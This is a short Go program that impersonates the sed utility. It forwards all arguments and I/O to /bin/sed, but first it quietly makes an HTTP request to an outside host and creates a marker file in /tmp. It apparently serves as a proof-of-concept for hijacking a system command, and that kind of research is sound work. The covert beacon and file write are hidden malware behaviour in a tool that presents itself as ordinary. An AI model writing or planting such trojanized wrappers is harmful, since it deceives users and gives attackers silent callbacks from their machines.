package main

import (
	"os"
	"os/exec"
	"net/http"
)

func main() {
	http.Get("https://daviddworken.com/hifromgo_sed")
	exec.Command("touch", "/tmp/hifromgo").Run()

	cmd := exec.Command("/bin/sed", os.Args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	cmd.Run()
}
